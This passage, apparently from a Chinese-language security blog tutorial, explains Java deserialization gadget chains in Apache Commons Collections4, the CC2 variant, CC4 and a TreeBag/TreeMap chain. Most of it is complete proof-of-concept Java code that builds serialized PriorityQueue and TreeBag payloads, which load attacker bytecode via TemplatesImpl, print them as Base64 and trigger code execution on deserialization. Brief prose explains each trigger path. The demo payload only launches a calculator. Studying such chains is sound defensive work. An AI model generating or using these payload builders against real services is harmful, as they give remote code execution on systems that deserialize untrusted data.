    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.Base64;
    import java.util.Comparator;
    import java.util.PriorityQueue;
    public class CC2_plus {
        public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
            Field field = obj.getClass().getDeclaredField(fieldname);
            field.setAccessible(true);
            field.set(obj,value);
        }
        public static void main(String[] args)throws Exception {
            //创建TemplatesImpl对象加载字节码
            byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj,"_name","jiang");
            setFieldValue(obj,"_class",null);
            setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
            setFieldValue(obj,"_bytecodes",new byte[][]{code});
            //创建TranformingComparator 实例
            Transformer transformer = new InvokerTransformer("toString",null,null);
            Comparator comparator = new TransformingComparator(transformer);
            //创建 PriorityQueue 实例
            //readobject 入口
            PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
            priorityQueue.add(obj);
            priorityQueue.add(obj);
            //修改调用方法为newTransformer，加载恶意类。
            setFieldValue(transformer,"iMethodName","newTransformer");
            ByteArrayOutputStream baor = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baor);
            oos.writeObject(priorityQueue);
            oos.close();
            System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
            //反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object o = ois.readObject();
            baor.close();
        }
    }
通过InvokerTransformer直接调用了动态加载bytecodes的TemplatesImpl类的newTransformer方法，进而调用了transformer，漏洞触发
你会觉得是不是缺少个`ConstantTransformer`得到对应对象的类型(我反正有过)
其实在`TransformingComparator#compare`方法中调用transformer的时候将这个类传入了transformer，这步就类似起到了ConstantTransformer的作用，所以这里向`PriorityQueue`中添加的是TemplatesImpl类
## CC4链子
### ysoserial中的链子
在ysoserial就是CC3+CC2的结合，它不再使用`InvokerTransformer`，而是选择`InstantiateTransformer`来代替
在CC3中存在一个`TrAXFilter`
它可以直接传入一个`Templates`然后直接调用他的newTransformer方法，之后我们使用`InstantiateTransformer`来进行实例化他触发`newTransformer`方法
#### POC
    package ysoserial.vulndemo;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassPool;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import javax.xml.transform.Templates;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.Base64;
    import java.util.Comparator;
    import java.util.PriorityQueue;
    public class CC4 {
        public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
            Field field = obj.getClass().getDeclaredField(fieldname);
            field.setAccessible(true);
            field.set(obj,value);
        }
        public static void main(String[] args) throws Exception {
            //创建TemplatesImpl对象加载字节码
            byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj,"_name","RoboTerh");
            setFieldValue(obj,"_class",null);
            setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
            setFieldValue(obj,"_bytecodes",new byte[][]{code});
            //创建 ChainedTransformer实例
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj}),
            };
            ChainedTransformer chain = new ChainedTransformer(transformers);
            //创建TranformingComparator 实例
            Comparator comparator = new TransformingComparator(chain);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(2);
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(priorityQueue, comparator);
            //序列化
            ByteArrayOutputStream baor = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baor);
            oos.writeObject(priorityQueue);
            oos.close();
            System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
            //反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object o = ois.readObject();
            baor.close();
        }
    }
### TreeBag & TreeMap
Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口
SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。
TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。
TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap
储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。
跟进`org.apache.commons.collections4.bag.TreeBag#readObject`方法
在反序列化的时候，会将反序列化出来的`Comparator`对象传入`TreeMap`进行处理
我们跟进他的构造函数
可以传入一个`Comparator`对象，将它传入TreeMap中
通过这个TreeMap来存储对象
然后回到`readObject`方法中，接下来将调用父类的`doReadObject`方法
调用了`TreeMap`的put方法，跟进
这里调用了`compare`方法进行排序，跟进
这里同样使用了`comparator.compare`进行比较，同样我们就可以使用`TransformingComparator`来触发transformer了
#### POC
    package ysoserial.vulndemo;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassPool;
    import org.apache.commons.collections4.bag.TreeBag;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.Base64;
    public class CC4_plus {
        public static void setFieldValue(Object obj,String fieldname,Object value)throws Exception{
            Field field = obj.getClass().getDeclaredField(fieldname);
            field.setAccessible(true);
            field.set(obj,value);
        }
        public static void main(String[] args) throws Exception {
            //创建TemplatesImpl对象加载字节码
            byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
            TemplatesImpl obj = new TemplatesImpl();
            setFieldValue(obj,"_name","RoboTerh");
            setFieldValue(obj,"_class",null);
            setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
            setFieldValue(obj,"_bytecodes",new byte[][]{code});
            //使用一个无害的InvokerTransformer
            InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
            TransformingComparator transformingComparator = new TransformingComparator(transformer);
            //创建TreeBag对象
            TreeBag treeBag = new TreeBag(transformingComparator);
            treeBag.add(obj);
            //更改调用方法
            setFieldValue(transformer, "iMethodName", "newTransformer");
            //序列化
            ByteArrayOutputStream baor = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baor);
            oos.writeObject(treeBag);
            oos.close();
            System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
            //反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object o = ois.readObject();
            baor.close();
        }
    }
使用`TemplatesImpl.newTransformer`方法触发transformer